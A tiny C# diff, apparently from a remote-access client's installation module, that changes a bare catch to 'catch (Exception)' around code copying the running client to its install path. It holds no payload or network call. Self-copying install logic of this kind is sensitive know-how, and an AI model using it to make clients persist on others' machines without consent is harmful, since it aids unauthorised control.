@@ -61,7 +61,7 @@ namespace xClient.Core.Installation
             {
                 File.Copy(ClientData.CurrentPath, ClientData.InstallPath, true);
             }
-            catch
+            catch (Exception)
             {
                 ClientData.Disconnect = true;
                 return;
